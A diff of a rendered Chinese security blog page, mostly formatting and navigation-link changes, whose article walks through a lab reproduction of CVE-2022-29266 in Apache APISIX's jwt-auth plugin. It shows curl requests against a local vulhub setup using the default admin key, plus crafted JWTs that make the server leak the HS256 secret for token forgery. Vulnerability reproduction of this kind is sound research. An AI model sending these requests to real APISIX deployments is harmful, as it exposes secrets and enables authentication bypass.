@@ -152,6 +152,17 @@
     
   </li>
   
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a target="_blank" rel="noopener" href="https://wiki.teamssix.com" class="waves-effect waves-light">
+      
+      <i class="fab fa-wikipedia-w" style="zoom: 0.6;"></i>
+      
+      <span>云安全知识库</span>
+    </a>
+    
+  </li>
+  
   <li>
     <a href="#searchModal" class="modal-trigger waves-effect waves-light">
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
@@ -251,6 +262,17 @@
 			    <i class="fa-fw fas fa-user-circle"></i>
 			
 			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a target="_blank" rel="noopener" href="https://wiki.teamssix.com" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-wikipedia-w"></i>
+			
+			云安全知识库
 		</a>
           
         </li>
@@ -447,7 +469,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.3k
+                    2.2k
                 </div>
                 
 
@@ -524,8 +546,8 @@
 <p>那么下面就开始搭环境，复现，顺便验证下漏洞分析的正确性。</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在 VulnHub 上有 APISIX CVE-2020-13945 漏洞的靶场，APISIX 版本为 2.11.0，因此我们可以直接用这个靶场作为 CVE-2022-29266 的靶场进行复现。</p>
 <p>环境搭建命令：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git
-cd vulhub&#x2F;apisix&#x2F;CVE-2020-13945
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git
+<span class="token builtin class-name">cd</span> vulhub/apisix/CVE-2020-13945
 docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>访问 <a target="_blank" rel="noopener" href="http://your-ip:9080/">http://your-ip:9080</a> 地址即可</p>
@@ -537,36 +559,36 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
 <pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>接着创建一个 consumer 对象，并设置 jwt-auth 的值，默认是 HS256 算法，secret  值为 teamssix-secret-key</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;apisix&#x2F;admin&#x2F;consumers -H &#39;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#39; -X PUT -d &#39;
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/apisix/admin/consumers -H <span class="token string">'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'</span> -X PUT -d <span class="token string">'
 &#123;
-&quot;username&quot;: &quot;jack&quot;,
-&quot;plugins&quot;: &#123;
-&quot;jwt-auth&quot;: &#123;
-&quot;key&quot;: &quot;rs-key&quot;,
-&quot;secret&quot;: &quot;teamssix-secret-key&quot;
+"username": "jack",
+"plugins": &#123;
+"jwt-auth": &#123;
+"key": "rs-key",
+"secret": "teamssix-secret-key"
 &#125;
 &#125;
-&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后再创建 Route 对象，并开启 jwt-auth 插件</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;apisix&#x2F;admin&#x2F;routes&#x2F;1 -H &#39;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#39; -X PUT -d &#39;
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/apisix/admin/routes/1 -H <span class="token string">'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'</span> -X PUT -d <span class="token string">'
 &#123;
-&quot;methods&quot;: [&quot;GET&quot;],
-&quot;uri&quot;: &quot;&#x2F;index.html&quot;,
-&quot;plugins&quot;: &#123;
-&quot;jwt-auth&quot;: &#123;&#125;
+"methods": ["GET"],
+"uri": "/index.html",
+"plugins": &#123;
+"jwt-auth": &#123;&#125;
 &#125;,
-&quot;upstream&quot;: &#123;
-&quot;type&quot;: &quot;roundrobin&quot;,
-&quot;nodes&quot;: &#123;
-&quot;0.0.0.0:80&quot;: 1
+"upstream": &#123;
+"type": "roundrobin",
+"nodes": &#123;
+"0.0.0.0:80": 1
 &#125;
 &#125;
-&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这时其实漏洞环境才算搭好，接下来就可以开始发送 Payload 了。</p>
 <p>将刚才由 RS256 算法生成的 JWT 值发送给 HS256 算法验证的路由，这样就可以获得刚才设置的 secret 值了。</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;index.html?jwt&#x3D;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/index.html?jwt<span class="token operator">=</span>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301603498.png"></p>
 <p>当我们拿到这个 sceret 值后，就可以伪造 JWT Token 了。</p>
@@ -575,41 +597,41 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
 <pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.bMCMT2wCP8X6duvDDuaR232ae3XkA3d2g-FKvI-D73sk8nTRWZEfovoh_FFi5PquyC81J5i5bED-rh1RMuDHlJVMYDKTP-EPdoRxugBdCCq9iEL3A004PTQM21rWLcPe1SOqp2Qvcf41iH-5r5Zs5cuAraQm4qFyhooCziSIPNnbyb8VUMx6k7fGS-WIBMVti-SjG5dEGLwAckCjc_XYMPrHqMRFYU_sB6jY05xX_9u5PFnuOQiu-q3c7gZLHdVSzHeYQGct-nrjcrM2VHvdkMIwMOr25UMhu200HFDhpLXuWpic7WC-rtztTZOtZne7UZ4s6MlnJavZiXWEq3Ovew<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>利用 curl 访问</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;index.html?jwt&#x3D;eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.bMCMT2wCP8X6duvDDuaR232ae3XkA3d2g-FKvI-D73sk8nTRWZEfovoh_FFi5PquyC81J5i5bED-rh1RMuDHlJVMYDKTP-EPdoRxugBdCCq9iEL3A004PTQM21rWLcPe1SOqp2Qvcf41iH-5r5Zs5cuAraQm4qFyhooCziSIPNnbyb8VUMx6k7fGS-WIBMVti-SjG5dEGLwAckCjc_XYMPrHqMRFYU_sB6jY05xX_9u5PFnuOQiu-q3c7gZLHdVSzHeYQGct-nrjcrM2VHvdkMIwMOr25UMhu200HFDhpLXuWpic7WC-rtztTZOtZne7UZ4s6MlnJavZiXWEq3Ovew -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/index.html?jwt<span class="token operator">=</span>eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.bMCMT2wCP8X6duvDDuaR232ae3XkA3d2g-FKvI-D73sk8nTRWZEfovoh_FFi5PquyC81J5i5bED-rh1RMuDHlJVMYDKTP-EPdoRxugBdCCq9iEL3A004PTQM21rWLcPe1SOqp2Qvcf41iH-5r5Zs5cuAraQm4qFyhooCziSIPNnbyb8VUMx6k7fGS-WIBMVti-SjG5dEGLwAckCjc_XYMPrHqMRFYU_sB6jY05xX_9u5PFnuOQiu-q3c7gZLHdVSzHeYQGct-nrjcrM2VHvdkMIwMOr25UMhu200HFDhpLXuWpic7WC-rtztTZOtZne7UZ4s6MlnJavZiXWEq3Ovew -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301603793.png"></p>
 <p>果然使用 RS512 算法同样可以触发，说明漏洞分析的没毛病。</p>
 <p>接着看看如果 secret 中包含了 CERTIFICATE 和 PUBLIC KEY 字符串，会返回什么。</p>
 <p>重新开一个环境后，创建一个 consumer 对象，这次 secret 设置为 teamssix-CERTIFICATE</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;apisix&#x2F;admin&#x2F;consumers -H &#39;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#39; -X PUT -d &#39;
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/apisix/admin/consumers -H <span class="token string">'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'</span> -X PUT -d <span class="token string">'
 &#123;
-&quot;username&quot;: &quot;jack&quot;,
-&quot;plugins&quot;: &#123;
-&quot;jwt-auth&quot;: &#123;
-&quot;key&quot;: &quot;rs-key&quot;,
-&quot;secret&quot;: &quot;teamssix-CERTIFICATE&quot;
+"username": "jack",
+"plugins": &#123;
+"jwt-auth": &#123;
+"key": "rs-key",
+"secret": "teamssix-CERTIFICATE"
 &#125;
 &#125;
-&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>创建 Route 对象，并开启 jwt-auth 插件</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;apisix&#x2F;admin&#x2F;routes&#x2F;1 -H &#39;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#39; -X PUT -d &#39;
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/apisix/admin/routes/1 -H <span class="token string">'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'</span> -X PUT -d <span class="token string">'
 &#123;
-&quot;methods&quot;: [&quot;GET&quot;],
-&quot;uri&quot;: &quot;&#x2F;index.html&quot;,
-&quot;plugins&quot;: &#123;
-&quot;jwt-auth&quot;: &#123;&#125;
+"methods": ["GET"],
+"uri": "/index.html",
+"plugins": &#123;
+"jwt-auth": &#123;&#125;
 &#125;,
-&quot;upstream&quot;: &#123;
-&quot;type&quot;: &quot;roundrobin&quot;,
-&quot;nodes&quot;: &#123;
-&quot;0.0.0.0:80&quot;: 1
+"upstream": &#123;
+"type": "roundrobin",
+"nodes": &#123;
+"0.0.0.0:80": 1
 &#125;
 &#125;
-&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>触发漏洞</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;index.html?jwt&#x3D;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/index.html?jwt<span class="token operator">=</span>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301604593.png"></p>
 <p>可以看到，这里并没有返回刚才设置的 secret 值，而是返回了 not enough data，即 err 的信息，这表明此时 cert 的值已经不为 nil 了，再次证明了上面的分析。</p>
@@ -1064,7 +1086,7 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">253.8k</span>&nbsp;字
+                class="white-color">253.7k</span>&nbsp;字
             
             
             
@@ -1167,10 +1189,6 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
         <i class="fab fa-cuttlefish"></i>
     </a>
 
-
-    <a href="https://www.zhihu.com/people/teamssix" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
-        <i class="fab fa-zhihu1">知</i>
-    </a>
 
 
 
